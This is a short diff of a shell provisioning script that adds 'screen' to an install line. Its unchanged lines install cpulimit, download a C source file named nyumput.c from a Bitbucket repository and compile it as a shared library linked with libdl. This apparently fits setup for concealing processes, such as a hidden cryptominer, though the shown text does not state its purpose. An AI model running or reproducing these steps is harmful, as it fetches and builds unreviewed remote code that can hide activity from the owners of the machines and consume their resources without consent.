@@ -2,7 +2,7 @@
 set -x
 apt-get update 
 apt-get install -y wget curl sudo
-apt-get install sudo wget cpulimit -y
+apt-get install sudo wget cpulimit screen -y
 curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
 apt-get install build-essential -y
 gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
